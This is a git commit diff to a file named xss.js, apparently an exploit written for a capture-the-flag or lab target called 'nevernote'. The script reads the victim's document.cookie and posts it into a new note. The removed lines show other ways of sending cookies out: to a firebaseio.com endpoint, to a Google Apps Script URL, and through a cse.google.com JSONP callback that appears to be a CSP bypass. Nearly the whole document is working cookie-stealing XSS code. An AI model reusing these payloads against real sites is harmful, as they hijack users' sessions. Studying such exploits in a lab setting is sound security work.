acbb4c5101a9a6027cb5fc8822694c1166d8dc87
Brendan Horng <brendan.horng@ludusamo.com>
2019-02-20 16:11:31 -0500

    Drop hostname

--- nevernote/xss.js
+++ nevernote/xss.js
@@ -3,23 +3,9 @@ formData.append('title', 'test');
 formData.append('content', document.cookie);
 formData.append('submit', 'save');
 
-//function takeData(data) {
-//    alert(1);
-//    fetch("https://test-43d17.firebaseio.com/cookie.json", {
-//        method: "POST",
-//        body: JSON.stringify({cookies: document.cooki})
-//    }).then(res =>{});
-//}
-
-//fetch("https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=takeData")
-//.then(res=>{
-//
-//});
-fetch("https://script.google.com/macros/s/AKfycbw810ejtzxD6RkRRiwH1UUp3QCZ-t71T6Gw0uPm4lD8JepQH1A/exec?action=get&cookie=Iamworking", {
-    method: "GET",
-    credentials: "same-origin"
+fetch("/note/new", {
+    method: "POST",
+    body: formData
 }).then(res => {
     alert(response.json);
 });
-
-//<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=fetch('https://test-43d17.firebaseio.com/cookie.json', {method:'POST',body:JSON.stringify('test')})"></script>
